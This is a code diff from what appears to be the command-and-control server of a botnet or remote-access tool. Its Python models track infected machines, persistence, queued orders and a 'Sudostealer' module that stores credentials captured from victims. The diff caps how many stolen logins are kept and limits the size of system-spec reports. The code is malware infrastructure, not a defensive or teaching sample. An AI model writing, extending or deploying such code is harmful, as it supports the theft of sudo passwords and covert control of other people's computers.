@@ -5,17 +5,32 @@ from glob import glob
 from pydantic import BaseModel
 import orders
 import con
+import pickle
 
 class PersistenceModule(BaseModel):
 	enabled: bool = False
 
 class SudostealerModule(BaseModel):
 	enabled: bool = False
-	credentials: list[str] = []
+	credentials: set[str] = []
+
+	# The max disk size of all the credentials should be ~16kB
+	def add(self, login: str):
+		if len(self.credentials) > 64: # Limit the number of credentials
+			return
+		self.credentials.add(login[:256]) # Truncate login at 256 characters
 
 class SpecsModule(BaseModel):
 	timestamp: int = -1
 	report: dict = {}
+
+	def update(self, report):
+		size = len(pickle.dumps(report))
+		if size > 32*1024:
+			print(f"Didn't save specs due to exceeding size limit of 32kB. Size is", size)
+			return
+		self.timestamp = int(datetime.now().timestamp())
+		self.report = report
 
 class Machine(BaseModel):
 	id: str
@@ -89,10 +104,6 @@ class Machine(BaseModel):
 				i.pending.remove(self.id)
 				i.done.append(self.id)
 				await con.broadcast_order_update(i)
-	
-	def update_specs(self, report):
-		self.specs.timestamp = int(datetime.now().timestamp())
-		self.specs.report = report
 
 
 os.makedirs("data/machines", exist_ok=True)
